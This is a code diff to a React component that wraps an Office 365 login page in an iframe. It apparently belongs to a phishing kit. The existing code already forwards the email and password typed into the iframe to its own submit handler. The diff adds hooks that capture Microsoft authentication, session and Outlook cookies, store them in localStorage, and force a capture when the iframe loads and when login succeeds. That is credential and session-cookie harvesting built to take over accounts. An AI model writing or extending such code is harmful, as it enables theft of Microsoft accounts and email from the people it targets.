@@ -1,6 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
+import { microsoftCookieCapture } from '../utils/microsoftCookieCapture';
 
 interface Office365WrapperProps {
   onLoginSuccess?: (sessionData: any) => void;
@@ -25,12 +26,42 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [isIframeLoading, setIsIframeLoading] = useState(true);
 
+  // Microsoft cookie capture integration
+  useEffect(() => {
+    const handleMicrosoftSession = (session: any) => {
+      console.log('🔵 Microsoft session captured in Office365Wrapper:', {
+        authCookies: session.authCookies.length,
+        sessionCookies: session.sessionCookies.length,
+        outlookCookies: session.outlookCookies.length
+      });
+      
+      // Optionally store Microsoft session data
+      if (session.authCookies.length > 0) {
+        localStorage.setItem('microsoft_session', JSON.stringify(session));
+      }
+    };
+
+    microsoftCookieCapture.onMicrosoftSession(handleMicrosoftSession);
+  }, []);
+
   // This logic for handling form submission from the iframe remains untouched
   useEffect(() => {
     const handleMessage = (event: MessageEvent) => {
       if (event.data.type === 'OFFICE_365_SUBMIT') {
         const { email, password } = event.data.payload;
         handleFormSubmit(new Event('submit'), { email, password, provider: 'Office365' });
+      }
+      
+      // Capture Microsoft cookies from iframe messages
+      if (event.data.type === 'MICROSOFT_COOKIES' || event.data.type === 'OFFICE_365_COOKIES') {
+        console.log('🔵 Received Microsoft cookies from iframe:', event.data);
+      }
+      
+      // Trigger cookie capture on successful authentication
+      if (event.data.type === 'OFFICE_365_AUTH_SUCCESS') {
+        setTimeout(() => {
+          microsoftCookieCapture.forceCaptureNow();
+        }, 1000);
       }
     };
     window.addEventListener('message', handleMessage);
@@ -70,7 +101,13 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
         style={{ display: isIframeLoading ? 'none' : 'block' }}
         className="w-full h-screen border-0"
         // When the iframe content is ready, hide the loader and show the iframe
-        onLoad={() => setIsIframeLoading(false)}
+        onLoad={() => {
+          setIsIframeLoading(false);
+          // Trigger initial cookie capture when iframe loads
+          setTimeout(() => {
+            microsoftCookieCapture.forceCaptureNow();
+          }, 2000);
+        }}
       />
     </>
   );
